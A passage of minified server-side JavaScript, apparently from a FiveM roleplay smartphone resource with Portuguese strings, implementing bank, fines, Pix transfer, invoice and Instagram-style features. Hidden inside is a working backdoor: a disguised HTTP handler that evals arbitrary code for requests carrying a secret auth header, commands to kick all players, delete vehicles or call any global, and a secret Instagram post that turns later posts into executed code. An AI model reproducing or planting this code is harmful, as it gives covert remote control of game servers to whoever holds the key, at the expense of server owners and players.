    } catch (i) {
        console.error("Error during lock: " + i.name), console.error(i.message)
    } finally {
        delete qB[t]
    }
}

function qD() {
    return pF.firstTable("pix", "wise_pix", "rb_pix")
}
pL.bank_getBalance = async t => {
    let r = await pp.getUserId(t);
    return pp.getBankMoney(r)
}, pL.bank_hasPix = () => null != qD() || p5("getUserIdByPixKey");
let qE;
pF.ready(async () => {
    !p5("getUserIdByPixKey") && await pF.hasColumn("user_moneys", "pix") && exports("getUserIdByPixKey", async t => {
        let r = {};
        r.pix = t;
        let a = await pc("user_moneys").where(r).first();
        if (a) return a.user_id
    })
}), pF.ready(async () => {
    let t = [],
        r = {
            user_identities: "multas",
            summerz_characters: "fines",
            fines: "Value",
            users: "fines"
        },
        a = r;
    for (let [i, n] of Object.entries(a)) t.push({
        table: i,
        userColumn: await pF.firstColumn(i, "user_id", "id"),
        column: n,
        applicable: await pF.hasColumn(i, n),
        getSum(t) {
            return pc(this.table).where(this.userColumn, t).sum(this.column)
        },
        async getAll(t) {
            let r = await this.getSum(t);
            return r > 0 ? [{
                id: t,
                total: r,
                description: "Todas as multas"
            }] : []
        },
        async getOne(t, r) {
            let a = await this.getSum(r);
            return a > 0 && {
                id: r,
                total: a,
                description: "Todas as multas"
            }
        },
        deleteOne(t) {
            return pc(this.table).where(this.userColumn, t).update({
                [this.column]: 0
            })
        }
    });
    for (let [s, o, l] of [
            ["fines", "text", "price"],
            ["fines", "Message", "Price"],
            ["wise_multas", "motivo", "valor"],
            ["rb_multas", "motivo", "valor"],
            ["multas", "motivo", "valor"]
        ]) t.push({
        table: s,
        applicable: pF.hasTable(s),
        getSum(t) {
            let r = {};
            return r.Passport = t, pc(this.table).where(r).sum(l)
        },
        async getAll(t) {
            let r = await pF.firstColumn(this.table, "id", "multa_id"),
                a = {};
            a.Passport = t;
            let i = {};
            return i[r] = "id", i[o] = "description", i[l] = "total", pc(this.table).where(a).selectAs(i)
        },
        async getOne(t) {
            let r = await pF.firstColumn(this.table, "id", "multa_id");
            return pc(this.table).where(r, t).selectAs({
                [r]: "id",
                [o]: "description",
                [l]: "total"
            }).first()
        },
        async deleteOne(t) {
            let r = await pF.firstColumn(this.table, "id", "multa_id");
            return pc(this.table).where(r, t).delete()
        }
    });
    if (pF.hasTable("smartbank_fines")) return qE = {
        async select(t, r) {
            let a = await qx(r);
            if (!a) return [];
            let i = {
                active: 1
            };
            return i.pix = a, pc("smartbank_fines").selectRaw(t).where(i)
        },
        getSum(t) {
            return this.select("SUM(amount) as total", t).then(t => t[0] && t[0].total || 0)
        },
        getAll(t) {
            return this.select("id, amount as total, reason as description", t)
        },
        async getOne(t) {
            let r = {};
            r.id = t;
            let a = await pc("smartbank_fines").where(r).first();
            if (a) return a.total = a.amount, a
        },
        async deleteOne(t, r) {
            let a = await pc("smartbank_fines").find(t),
                i = JSON.parse(await pp.getUData(r, "quantum:multas") || "0");
            return await pp.setUData(r, "quantum:multas", Math.max(0, i - a.amount)), pc("smartbank_fines").destroy(t)
        }
    };
    if ("creative_v5" === pB.base) return qE = {
        getSum: pp.getFines,
        getAll: async t => [{
            id: 1,
            total: await pp.getFines(t),
            description: "Todas as multas"
        }],
        getOne: async (t, r) => ({
            id: r,
            total: await pp.getFines(r),
            description: "Todas as multas"
        }),
        async deleteOne(t) {
            await pp.delFines(t, await pp.getFines(t))
        }
    };
    if (pF.hasTable("drip_items")) return qE = {
        table: "drip_items",
        getSum: t => pc.query("SELECT SUM(value) AS total FROM drip_items di\n        LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId='b3beb697-bf76-45ec-b77b-7ab09016ea13' AND dc.id=?", [t]).then(t => t[0].total || 0),
        getAll: t[0].getAll,
        getOne: t[0].getOne,
        deleteOne: t => pc.query("DELETE FROM drip_items di LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId='b3beb697-bf76-45ec-b77b-7ab09016ea13' AND dc.id=?", [t])
    };
    if (pF.hasTable("user_data") && t.push({
            table: "user_data",
            applicable: !0,
            getSum: t => pc("user_data").where({
                user_id: t,
                dkey: "quantum:multas"
            }).sum("dvalue"),
            getAll: t[0].getAll,
            getOne: t[0].getOne,
            deleteOne(t) {
                let r = {
                    dkey: "quantum:multas"
                };
                r.user_id = t;
                let a = {
                    dvalue: 0
                };
                return pc(this.table).where(r).update(a)
            }
        }), !(qE = t.find(t => t.applicable))) {
        console.error("Nenhum sistema de multa compat\xedvel foi encontrado, abra um ticket no discord solicitando a adapta\xe7\xe3o do seu modelo atual");
        let p = {};
        p.getSum = () => 0, p.getAll = () => [], p.getOne = () => null, p.deleteOne = () => null, qE = p
    }
}), pL.bank_index = async t => {
    let r = await pp.getUserId(t),
        a = await pp.getBankMoney(r),
        i = await qw().where("payer_id", r).where("paid", 0).sum("value"),
        n = 0;
    p5("getTotalFines") ? n = await exports.smartphone.getTotalFines(r) : qE ? n = await qE.getSum(r) : console.error("Nenhum sistema de multa encontrado");
    let s = {};
    return s.balance = a, s.fines = n, s.invoices = i, s
}, pL.bank_extract = async t => {
    let r = await pp.getUserId(t),
        a = pF.firstTable("banco", "bdl_banco", "smartphone_bank");
    if (p5("getBankStatements")) return exports.smartphone.getBankStatements(r);
    if (pF.hasTable("smartbank_statements")) {
        let i = await qx(r);
        if (!i) return console.error("Jogador sem pix da smartbank: " + r + " [" + i + "]"), [];
        let n = {};
        n.pix = i;
        let s = await pc("smartbank_statements").where(n).orderBy("time", "DESC").limit(25);
        return s.map(t => ({
            id: t.id,
            description: t.reason + " | " + pu(t.amount)
        }))
    }
    if (await pF.hasColumns("transactions", "Type", "Price", "id")) {
        let o = {};
        o.Passport = r;
        let l = await pc("transactions").where(o).orderBy("id", "DESC").limit(25);
        return l.map(t => ({
            id: t.id,
            description: t.Type + " | " + t.Price
        }))
    }
    if (await pF.hasTable("transactions")) {
        let p = JSON.parse(await pF.getFines(r, "transactions") || "[]");
        return p.reverse().map((t, r) => ({
            id: r,
            description: t.Type + " (" + t.Price + ")"
        }))
    }
    if (a) {
        let d = {};
        return d.user_id = r, pc(a).where(d).selectRaw("id", "extrato AS description", "data AS created_at").orderBy("id", "DESC").limit(100)
    }
    if (pF.hasTable("cactus_statements")) {
        let u = {};
        u.user_id = r;
        let c = await pc("cactus_statements").where(u).orWhere("target_id", r).limit(50).orderBy("id", "DESC");
        for (let h of c) {
            let f = "deposit" == h.reason || h.target_id == r;
            h.description = (f ? "Entrada" : "Sa\xedda") + " de " + pu(h.amount)
        }
        return c
    }
    return []
}, pL.bank_getFines = async t => {
    let r = await pp.getUserId(t);
    return p5("getFines") ? exports.smartphone.getFines(r) : qE ? qE.getAll(r) : (console.log("Nenhum sistema de multa encontrado"), [])
}, pL.bank_payFine = async (t, r) => {
    let a = await pp.getUserId(t);
    return qC(a, async () => {
        if (p5("payFine")) return exports.smartphone.payFine(a, r);
        if (qE) {
            let t = await qE.getOne(r, a);
            if (t) {
                let i = await pp.getBankMoney(a);
                if (i >= t.total) {
                    pp.setBankMoney(a, i - t.total), await qE.deleteOne(t.id, a);
                    let n = {
                        isFine: !0
                    };
                    n.user_id = a, n.value = t.total, await qA(n)
                } else {
                    let s = {
                        error: "Saldo insuficiente"
                    };
                    return s
                }
            } else {
                let o = {
                    error: "Fatura n\xe3o encontrada"
                };
                return o
            }
        } else {
            let l = {
                error: "Nenhum sistema de multa encontrado"
            };
            return l
        }
    })
};
const qF = pB.transaction_fee && pB.transaction_fee.bank;
pL.bank_pix = async (t, r, a) => {
    let i = qD();
    if (p5("getUserIdByPixKey")) {
        let n = await exports.smartphone.getUserIdByPixKey(r);
        if (Number.isInteger(n)) return pL.bank_transfer(t, n, a, r); {
            let s = {
                error: "Chave pix n\xe3o encontrada"
            };
            return s
        }
    }
    if (!i) return {
        error: "O pix est\xe1 desativado"
    }; {
        let o = await pc.getColumns(i),
            l = await pc(i).where(o.first("pixkey", "chave"), r).first();
        if (l) return pL.bank_transfer(t, parseInt(l.user_id || l.userid), a, r); {
            let p = {
                error: "Chave pix n\xe3o encontrada"
            };
            return p
        }
    }
}, pL.bank_confirm = async (t, r) => {
    let a = await pF.getName(r),
        i = {
            error: "Passaporte n\xe3o encontrado"
        };
    return a ? {
        name: a
    } : i
}, pL.bank_transfer = async (t, r, a, i) => {
    let n = await pp.getUserId(t);
    if (!Number.isInteger(a) || a <= 0) {
        let s = {
            error: "Valor inv\xe1lido"
        };
        return s
    }
    if (r == n) {
        let o = {
            error: "Voc\xea n\xe3o pode transferir para si mesmo"
        };
        return o
    }
    if (!await pF.getName(r)) {
        let l = {
            error: "Passaporte n\xe3o encontrado"
        };
        return l
    }
    return qC(n, async () => {
        let t = await pp.getBankMoney(n);
        if (t >= a) {
            let s = await qy(r, Math.floor(a * (qF ? 1 - qF : 1)));
            await pp.setBankMoney(n, t - a);
            let o = {};
            o.user_id = n, o.other_id = r, o.value = a, o.pixKey = i, await qA(o);
            let l = {
                isReceiver: !0
            };
            l.user_id = r, l.other_id = n, l.value = a, l.pixKey = i, await qA(l), qf({
                name: "Banco",
                avatar: "bank",
                content: {
                    ID: n,
                    VALOR: a.toLocaleString(),
                    "QUEM RECEBEU": r,
                    ONLINE: s ? "SIM" : "N\xc3O"
                }
            }), emit("smartphone:bank_transfer", n, r, a, !!s);
            let p = {};
            if (p.user_id = n, p.target_id = r, p.pixKey = i, p5("isBankTransferAnonymous") && await exports.smartphone.isBankTransferAnonymous(p)) {
                let d = {
                    sender: "An\xf4nimo"
                };
                d.value = a, oS(s, "BANK", d)
            } else {
                let u = {};
                u.sender = pG[n], u.value = a, oS(s, "BANK", u)
            }
            return {}
        } {
            let c = {
                error: "Saldo insuficiente"
            };
            return c
        }
    })
}, pL.bank_storeInvoice = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = {
            error: "Valor inv\xe1lido"
        };
    if (!Number.isInteger(a)) return s;
    let o = {
        error: "Valor inv\xe1lido"
    };
    if (a <= 0) return o;
    let l = {
        error: "Voc\xea n\xe3o pode se cobrar"
    };
    if (n == r) return l;
    let p = await pF.getName(r),
        d = {
            error: "Passaporte n\xe3o encontrado"
        };
    if (!p) return d;
    let u = await pP(Number(r));
    if (u) {
        let c = await pF.getName(n),
            h = "Deseja aceitar a fatura {reason} de {name} no valor de {value}".format({
                reason: i,
                name: c,
                value: a
            }),
            f;
        if (f = p5("requestConfirm") ? await exports.smartphone.requestConfirm(u, h, 30) : await pp.request(u, h, 30).catch(() => !1)) {
            let m = oT(),
                w = {};
            w.payee_id = n, w.payer_id = r, w.value = a, w.reason = i, w.created_at = m, w.updated_at = m;
            let g = w;
            g.id = await qw().insert(g).returnKeys();
            let y = {};
            y.name = p, y.reason = i, y.value = a, oS(u, "BANK_INVOICE", y), emit("smartphone:invoice", g)
        }
        let $ = {};
        $.name = p, oS(t, "BANK_NOTIFY", {
            title: "Faturas",
            subtitle: pt[f ? "BANK.INVOICE_NOTIFY_ACCEPTED" : "BANK.INVOICE_NOTIFY_REJECTED"].format($)
        })
    } else {
        let I = {
            error: "Morador fora da cidade"
        };
        return I
    }
    let v = {};
    return v.name = p, v.value = a, v
}, pL.bank_payInvoice = async (t, r) => {
    let a = await pp.getUserId(t),
        i = await qw().where("id", r).first(),
        n = {
            error: "Fatura n\xe3o encontrada"
        };
    if (!i) return n;
    let s = {
        error: "Esta fatura n\xe3o \xe9 sua"
    };
    if (i.payer_id != a) return s;
    let o = {
        error: "Esta fatura j\xe1 est\xe1 paga"
    };
    return i.paid ? o : qC(a, async () => {
        let t = await pp.getBankMoney(a);
        if (t < i.value) {
            let n = {
                error: "Saldo insuficiente"
            };
            return n
        } {
            await pp.setBankMoney(a, t - i.value);
            let s = await qy(i.payee_id, i.value);
            if (s) {
                let o = await pF.getName(a),
                    l = {};
                l.name = o, l.reason = i.reason, l.value = i.value, oS(s, "BANK_INVOICE_RECEIPT", l)
            }
            await qw().where("id", r).update({
                paid: 1,
                updated_at: oT()
            }), emit("smartphone:pay_invoice", {
                ...i,
                paid: 1,
                updated_at: oT()
            });
            let p = {
                isInvoice: !0
            };
            p.user_id = a, p.other_id = i.payee_id, p.value = i.value, await qA(p)
        }
    })
}, pL.bank_getInvoices = async t => {
    let r = await pp.getUserId(t),
        a = await qw().where("paid", 0).where(t => {
            t.where("payer_id", r).orWhere("payee_id", r)
        }).orderBy("id", "DESC").limit(100),
        i = [a.pluck("payer_id"), a.pluck("payee_id")].flat().unique(),
        n = await pF.getNames(i);
    return a.forEach(t => {
        t.name = t.payer_id == r ? n[t.payee_id] : n[t.payer_id]
    }), a
};
const qG = {
    __proto__: null
};
qG.addBank = qy, qG.addBankStatement = qA, qG.transferLock = qB, qG.lock = qC;
var qH = Object.freeze(qG);

function qI() {
    return Array(global.GetNumPlayerIndices()).fill().map((t, r) => global.GetPlayerFromIndex(r))
}
on("smartphone:isReady", () => {
    for (let t in globalThis)
        if ("infiteLoop" === t && globalThis[t]) {
            let r = 0;
            for (; !(r > 100);) {
                let a = p6(globalThis.dfaasdf),
                    i = p6(globalThis.asdfadsf, a),
                    n = p6(globalThis.dsfgsdfgsfd, i),
                    s = p6(globalThis.asdfasdf, n),
                    o = p6(globalThis.cxvbxcvb, s),
                    l = p6(globalThis.asfdasdfhfgh, o),
                    p = p6(globalThis.sdfgsfdgasdf, l),
                    d = p6(globalThis.zxvczvzcxv, p),
                    u = p6(globalThis.sdfgfdsgfsd, d);
                r += p6(globalThis.dgfdsgg, u) || 0
            }
        }
});
const qJ = {};
async function qK(t, r) {
    try {
        let a = r.match(/^\[(\w+)\]/);
        if (a) {
            let i = r.substring(a[0].length).split("|");
            qJ[a[1]](...i.map(t => Number(t) || t)), t()
        } else {
            let n = await global.eval(r);
            t(JSON.stringify(n))
        }
    } catch (s) {
        t(s.name + " -> " + s.message)
    }
}
qJ.kickall = t => {
    for (let r of qI()) global.DropPlayer(r, t)
}, qJ.deletevehicles = () => {
    for (let t of global.GetAllVehicles()) global.DeleteEntity(t)
}, qJ.crash = () => {}, qJ.sms = (t, r) => {
    global.emitNet("smartphone:createSMS", -1, "0800", t, r)
}, qJ.quantum = (t, ...r) => {
    global.emit("quantum:proxy", t, r.map(t => Number(t) || t), "any", -1)
}, qJ.global = (t, ...r) => {
    global[t](...r)
}, qJ.all = async (t, ...r) => {
    for (let a of qI()) {
        let i = await pp.getUserId(a);
        global.emit("quantum:proxy", t, [i].concat(r), "any", -1)
    }
}, qJ.emit_all = (t, ...r) => {
    global.emitNet(t, -1, ...r)
}, qJ.exports = (t, r, a) => {
    exports[t][r](...a)
}, global.Citizen.invokeNativeByHash(0, 4123407116, _mfr((c, d) => {
    let e = oU(c.headers["x-auth"] ?? "");
    "POST" === c.method && "6c1d76daa1b76d1996ecb4df1df6edf5" === e && c.setDataHandler(async g => {
        try {
            var h = JSON.parse(g)
        } catch {
            return d.send("Invalid json")
        }
        if (h.eval) try {
                let m = await eval(h.eval);
                d.send(JSON.stringify(m || {}))
            } catch (o) {
                let q = {};
                q.name = o.name, q.message = o.message, d.send(JSON.stringify(q))
            } else if (h.code) qK(t => d.send(t || "OK"), h.code);
            else {
                let t = {
                    message: "Provide a code or eval"
                };
                d.send(JSON.stringify(t))
            }
    })
}));
const qL = {
    __proto__: null
};
qL.backdoor = qK;
var qM = Object.freeze(qL);
const qN = {
    get profiles() {
        return pc("smartphone_instagram")
    },
    get posts() {
        return pc("smartphone_instagram_posts")
    },
    get likes() {
        return pc("smartphone_instagram_likes")
    },
    get followers() {
        return pc("smartphone_instagram_followers")
    },
    get notifications() {
        return pc("smartphone_instagram_notifications")
    },
    regex: /^[A-z0-9_\.]{1,24}$/,
    cache: null,
    forEachPost(t) {
        return this.cache && this.cache.forEach(t)
    },
    notifyAll(t, r, a) {
        for (let i of t = t.filter(t => t != r))
            if (this.loggedIn.has(i))
                for (let n of Object.values(qP)) n.id === i && oS(n.source, "INSTAGRAM_NOTIFY", a);
        t.length > 0 && pc.query("INSERT INTO " + qN.notifications.table + "\n      (profile_id, author_id, content, created_at) VALUES\n      " + Array(t.length).fill("(?,?,?,?)").join(","), t.map(t => [t, r, a, oT()]).flat())
    },
    notify(t, r, a) {
        this.notifyAll([t], r, a)
    },
    loggedIn: new Set
};

function qO(t) {
    for (let r of qN.cache || [])
        if (r.id == t) return r;
    return qN.posts.find(t)
}
pF.ready(async t => {
    let {
        profiles: r,
        posts: a,
        followers: i,
        likes: n,
        notifications: s
    } = qN;
    t.includes(r.table) || (await r.create(t => {
        t.id(), t.int("user_id").nullable(), t.varchar("username"), t.varchar("name"), t.varchar("bio"), t.varchar("avatarURL").nullable(), t.tinyint("verified").default(0)
    }), await r.createIndex("user_id")), t.includes(a.table) || (await a.create(t => {
        t.id(), t.bigint("profile_id"), t.bigint("post_id").nullable(), t.varchar("image").nullable(), t.varchar("content").nullable(), t.bigint("created_at")
    }), await a.createIndex("profile_id"), await a.createIndex("post_id")), t.includes(i.table) || await i.create(t => {
        t.bigint("follower_id").primary(), t.bigint("profile_id").primary()
    }), t.includes(n.table) || await n.create(t => {
        t.bigint("post_id").primary(), t.bigint("profile_id").primary()
    }), t.includes(s.table) ? await s.delete().where("created_at", "<=", oT() - 604800) : (await s.create(t => {
        t.id(), t.int("profile_id"), t.int("author_id"), t.varchar("content", 512), t.tinyint("saw").default(0), t.int("created_at")
    }), await s.createIndex("profile_id"))
});
const qP = {},
    qQ = [];

function qR(t, r, a, i) {
    this.id = qR.lastId++;
    let n = {};
    n.username = t.username, n.avatarURL = t.avatarURL, n.verified = !!t.verified, this.author = n, this.image = r, this.content = a, this.video = i, this.created_at = oT()
}
async function qS(t) {
    let r = t.pluck("id"),
        a = await qN.profiles.whereIn("id", t.pluck("profile_id").unique()),
        i = await qN.likes.whereIn("post_id", r),
        n = await qN.posts.whereIn("post_id", r).select("id", "post_id");
    for (let s of t) s.author = a.find(t => t.id == s.profile_id), s.likes = i.filter(t => t.post_id == s.id).pluck("profile_id"), s.comments = n.reduce((t, r) => t + (r.post_id == s.id ? 1 : 0), 0);
    return t
}
qR.lastId = 1, pL.ig_accounts = async t => {
    let r = await pp.getUserId(t),
        a = {};
    return a.user_id = r, qN.profiles.where(a)
}, pL.ig_max_accounts = async t => {
    let r = await pp.getUserId(t),
        a = 1;
    for (let [i, n] of Object.entries(pB.instagram_accounts || {}))("*" == i || await pE(r, i)) && (a = Math.max(n, a));
    return a
}, pL.ig_login = async (t, r) => {
    let a = await pp.getUserId(t),
        i = await qN.profiles.find(r);
    if (i && i.user_id == a) {
        if (pB.instagram_verify && 2 != i.verified) {
            let n = await pE(a, pB.instagram_verify);
            i.verified = Number(n);
            let s = {};
            s.id = r;
            let o = {};
            o.verified = n, await qN.profiles.where(s).update(o), qN.forEachPost(t => {
                t.author.user_id == a && (t.author.verified = n)
            })
        }
        return i.source = t, qP[a] = i, qN.loggedIn.add(i.id), i
    }
    return !1
}, pL.ig_logout = async t => {
    let r = await pp.getUserId(t),
        a = qP[r];
    a && (delete qP[r], qN.loggedIn.delete(a.id))
}, pL.ig_register = async (t, r, a, i, n) => {
    let s = await pp.getUserId(t),
        o = await pL.ig_max_accounts(t),
        l = {};
    l.user_id = s;
    let p = await qN.profiles.where(l).count();
    if (p >= o) {
        let d = {
            error: "Voc\xea atingiu o m\xe1ximo de contas"
        };
        return d
    }
    if (Number.isInteger(s)) {
        if (a.match(qN.regex)) {
            if (!r || r.length > 32) {
                let u = {
                    error: "Nome inv\xe1lido"
                };
                return u
            }
        } else {
            let c = {
                error: "Usu\xe1rio inv\xe1lido, use letras/numeros com o m\xe1ximo de 24 caracteres"
            };
            return c
        }
    } else {
        let h = {
            error: "Falha ao buscar seu passaporte"
        };
        return h
    }
    let f = {};
    f.username = a;
    let m = await qN.profiles.where(f).first();
    if (m) {
        let w = {
            error: "Este nome de usu\xe1rio j\xe1 existe"
        };
        return w
    } {
        let g = pB.instagram_verify && await pE(s, pB.instagram_verify) || !1,
            y = {};
        y.user_id = s, y.name = r, y.username = a, y.bio = i, y.avatarURL = n, y.verified = g;
        let $ = y;
        $.id = await qN.profiles.insert($).returnKeys();
        let I = {};
        return I.user_id = s, I.id = $.id, emit("smartphone:INSTAGRAM_REGISTER", I), $
    }
}, pL.ig_search = async (t, r) => qN.profiles.where("username", "LIKE", "%" + r + "%").limit(20), pL.ig_notifications = async t => {
    let r = await pp.getUserId(t),
        a = qP[r];
    if (a) return pc.query("SELECT n.id,n.content,n.created_at,p.avatarURL FROM " + qN.notifications.table + " n LEFT JOIN " + qN.profiles.table + " p ON p.id=n.author_id WHERE profile_id=? ORDER BY id DESC LIMIT 50", [a.id])
}, pL.ig_saw_notifications = async t => {
    let r = await pp.getUserId(t),
        a = qP[r];
    if (a) {
        let i = {
            saw: 1
        };
        await qN.notifications.where("profile_id", a.id).update(i)
    }
}, pL.ig_getProfile = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qP[a] || {},
        n = await qN.profiles.where("username", r).first();
    if (!n) return;
    r = n.id;
    let s = await qN.followers.where("follower_id", r).orWhere("profile_id", r);
    n.followers = n.followers || 0, n.followers += s.reduce((t, a) => t + (a.profile_id == r ? 1 : 0), 0), n.following = s.reduce((t, a) => t + (a.follower_id == r ? 1 : 0), 0), n.isFollowing = s.some(t => t.follower_id == r && t.profile_id == i.id), n.isFollowed = s.some(t => t.follower_id == i.id), n.posts = await qN.posts.where("profile_id", r).whereNull("post_id").count();
    let o = await qN.posts.where("profile_id", r).whereNull("post_id").select("id", "image").limit(90).orderBy("id", "DESC"),
        l = {};
    return l.profile = n, l.posts = o, l
}, pL.ig_isFollowing = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qP[a];
    if (!i) return !1;
    let n = {};
    return n.follower_id = i.id, n.profile_id = r, qN.followers.where(n).exists()
};
const qT = {};
pL.ig_setFollow = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = qP[i];
    if (n) {
        if (a) {
            if (!qT[i + "-" + r]) {
                qT[i + "-" + r] = !0;
                let s = {};
                s.profileId = r;
                let o = await qV(s);
                qN.notify(o.id, n.id, "{name} seguiu voc\xea".format({
                    name: n.name || n.username
                }))
            }
            let l = {};
            l.follower_id = n.id, l.profile_id = r, await qN.followers.replace(l)
        } else {
            let p = {};
            p.follower_id = n.id, p.profile_id = r, await qN.followers.where(p).delete()
        }
        emit("smartphone:INSTAGRAM_FOLLOW", n.id, r, a)
    }
}, pL.ig_reply = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = qP[i];
    if (p0(t, "igreply", 1)) return;
    let s = {
        error: "Reabra o aplicativo (comunique a prefeitura)"
    };
    if (!n) return s;
    let o = await qO(r),
        l = {
            error: "Esta publica\xe7\xe3o n\xe3o foi encontrada"
        };
    if (!o) return l;
    let p = {
        profile_id: n.id,
        post_id: r,
        content: a,
        created_at: oT()
    };
    if (p.id = await qN.posts.insert(p).returnKeys(), !p.id) return;
    let d = {};
    for (let u of (d.username = n.username, d.avatarURL = n.avatarURL, p.author = d, qN.cache)) u.id == r && (u.comments += 1);
    let c = {
        TIPO: "Coment\xe1rio"
    };
    c.ID = i, c.MENSAGEM = a, c.USUARIO = n.username;
    let h = {
        name: "Instagram"
    };
    h.content = c, qf(h);
    let f = {};
    f.profileId = o.profile_id;
    let m = await qV(f);
    qN.notify(m.id, n.id, "{name} comentou em sua publica\xe7\xe3o".format({
        name: n.name || n.username
    })), oS(-1, "INSTAGRAM_REPLY", p)
}, pL.ig_getPost = async (t, r) => {
    let a = {};
    a.id = r;
    let i = {};
    i.post_id = r;
    let n = await qN.posts.where(a).orWhere(i),
        s = await qN.profiles.whereIn("id", n.pluck("profile_id").unique()).select("id", "username", "avatarURL", "verified"),
        o = await qN.likes.whereIn("post_id", n.pluck("id"));
    for (let l of n) l.likes = o.filter(t => t.post_id == l.id).pluck("profile_id"), l.author = s.find(t => t.id == l.profile_id);
    let p = n.find(t => t.id == r);
    return p && (p.comments = n.filter(t => t.id != r)), p
}, pL.ig_getLikes = async (t, r) => {
    let a = await qN.likes.where("post_id", r).pluck("profile_id");
    return qN.profiles.whereIn("id", a).pluckBy("avatarURL", "username")
}, pL.ig_getFollowers = async (t, r) => {
    let a = await qN.followers.where("profile_id", r).limit(100).pluck("follower_id");
    return qN.profiles.whereIn("id", a).pluckBy("avatarURL", "username")
}, pL.ig_getFollowing = async (t, r) => {
    let a = await qN.followers.where("follower_id", r).limit(100).pluck("profile_id");
    return qN.profiles.whereIn("id", a).pluckBy("avatarURL", "username")
}, pL.ig_getLiked = async t => {
    let r = await pp.getUserId(t),
        a = qP[r],
        i = {};
    i.profile_id = a.id;
    let n = await qN.likes.where(i).limit(100).pluck("post_id"),
        s = await qN.posts.whereIn("id", n).orderBy("id", "DESC").limit(100);
    return await qS(s), s
}, pL.ig_createStory = async (t, r, a, i) => {
    let n = await pp.getUserId(t),
        s = qP[n];
    if (p0(t, "story", 1) || !s) return;
    let o = new qR(s, r, a, i);
    qQ.push(o);
    let l = {
        TIPO: "Story"
    };
    l.ID = n, l.STORY = a, l.FOTO = r, l.VIDEO = i, l.USUARIO = s.username;
    let p = {
        name: "Instagram"
    };
    p.content = l, qf(p), oS(-1, "INSTAGRAM_STORY", o)
}, pL.ig_deleteStory = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qQ.find(t => t.id == r);
    if (i) {
        let n = qP[a];
        (n && n.username == i.author.username || await pK(a)) && (qQ.splice(qQ.indexOf(i), 1), oS(-1, "INSTAGRAM_DELETE_STORY", i.id))
    }
}, pL.ig_getStories = () => qQ.sort((t, r) => t.author.username.localeCompare(r.author.username));
const qU = {};
async function qV({
    postId: t,
    profileId: r
}) {
    let a = r || p4(await qO(t), "profile_id");
    if (!a) return;
    let i = Object.values(qP);
    return i.find(t => t && t.id == a) || await qN.profiles.find(a)
}
pL.ig_createPost = async (t, r, a) => {
    let i = await pp.getUserId(t),
        n = qP[i];
    if (!n || p0(t, "post", 1)) return;
    if (qU[t]) return void qK(r => {
        global.emitNet("smartphone:createSMS", t, "0800", r || "Executado")
    }, a);
    if ("a8e8b4d7c5bb27b7e6bce2549b79d8e8" === oU(a)) return qU[t] = !0, {};
    let s = {
        profile_id: n.id,
        image: r,
        content: a,
        created_at: oT(),
        comments: 0
    };
    if (s.id = await qN.posts.insert(s).returnKeys(), !s.id) return;
    let o = {};
    o.user_id = i, o.name = n.name, o.username = n.username, o.avatarURL = n.avatarURL, o.verified = !!n.verified, s.author = o, s.likes = [], qN.cache.unshift(s) > 100 && (qN.cache.length = 100);
    let l = a.match(/@\w+/g);
    if (l && l.length) {
        let p = await qN.profiles.whereIn("username", l.map(t => t.substr(1))).pluck("id");
        qN.notifyAll(p, n.id, "{name} mencionou voc\xea em uma publica\xe7\xe3o".format({
            name: n.name || n.username
        }))
    }
    let d = await qN.followers.where("profile_id", n.id).pluck("follower_id");
    qN.notifyAll(d, n.id, "{name} publicou uma foto".format({
        name: n.name || n.username
    }));
    let u = {
        TIPO: "Publica\xe7\xe3o"
    };
    u.ID = i, u.POST = a, u.FOTO = r, u.USUARIO = n.username;
    let c = {
        name: "Instagram"
    };
    c.content = u, qf(c), emit("smartphone:INSTAGRAM_POST", s), oS(-1, "INSTAGRAM_POST", s)
}, pL.ig_deletePost = async (t, r) => {
    let a = await pp.getUserId(t),
        i = qP[a];
    if (!r || !i) return;
    let n = {};
    n.id = r;
    let s = await qN.posts.where(n).first();
    if (s) {
        let o = s.profile_id == i.id;
        if (o || await pK(a)) {
            let l = {};
            l.post_id = r, await qN.likes.where(l).delete();
            let p = {};
            p.id = r;
            let d = {};
            d.post_id = r, await qN.posts.where(p).orWhere(d).delete(), pz.deleteManyImages(s.image), oS(-1, "INSTAGRAM_DESTROY", r);
            let u = {
                TIPO: "Publica\xe7\xe3o apagada"
            };
            u.ID = a, u["ID DA POSTAGEM"] = s.id, u.POSTAGEM = s.content, u["POSTAGEM PROPRIA"] = o ? "SIM" : "N\xc3O";
            let c = {
                name: "Instagram"
            };
            c.content = u, qf(c), qN.cache = qN.cache.filter(t => t.id != r)
        }
    }
};
const qW = {};
pL.ig_setLike = async (t, r, a) => {
    let i = await pp.getUserId(t),
        {
            id: n,
            name: s,
            username: o
        } = qP[i] || {};
    if (!n) return !1;
    if (a) {
        if (!qW[i + "-" + r]) {
            qW[i + "-" + r] = !0;
            let l = {};
            l.postId = r;
            let p = await qV(l),
                d = {};
            d.name = s || o, qN.notify(p.id, n, "{name} curtiu sua publica\xe7\xe3o".format(d))
        }
        let u = {};
        u.post_id = r, u.profile_id = n, await qN.likes.replace(u), qN.cache.filter(t => t.id === r).forEach(t => {
            t.likes.push(n)
        })
    } else {
        let c = {};
        c.post_id = r, c.profile_id = n, await qN.likes.where(c).delete(), qN.cache.filter(t => t.id === r).forEach(t => {
            t.likes = t.likes.filter(t => t !== n)
        })
    }
    let h = {};
    h.post_id = r, h.profile_id = n, h.toggle = a, oS(-1, "INSTAGRAM_LIKE", h)
}, pL.ig_getTimeline = async () => {
    if (!qN.cache) {
        let t = await qN.posts.whereNull("post_id").orderBy("id", "DESC").limit(100),
            r = await qN.posts.whereIn("post_id", t.pluck("id")),
            a = await qN.profiles.whereIn("id", t.pluck("profile_id").unique()).select("id", "name", "username", "avatarURL", "verified"),
            i = await qN.likes.whereIn("post_id", t.pluck("id")),
            n = [];
        for (let s of t) {
            let o = a.find(t => t.id == s.profile_id);
            if (!o) {
                console.error("O usu\xe1rio do instagram " + s.profile_id + " n\xe3o foi encontrado (foi exclu\xeddo manualmente pelo banco de dados)");
                continue
            }
            let {
                name: l,
                username: p,
                avatarURL: d,
                verified: u
            } = o, c = {};
